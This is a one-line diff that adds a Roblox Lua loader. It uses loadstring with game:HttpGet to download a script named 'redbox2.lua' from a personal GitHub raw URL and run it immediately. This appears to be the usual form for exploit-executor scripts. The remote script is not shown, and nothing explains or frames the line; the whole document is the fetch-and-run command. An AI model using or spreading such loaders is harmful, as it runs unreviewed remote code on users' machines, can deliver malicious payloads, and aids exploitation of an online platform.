@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CheeseOnGithub/scripts/main/redbox2.lua",true))()
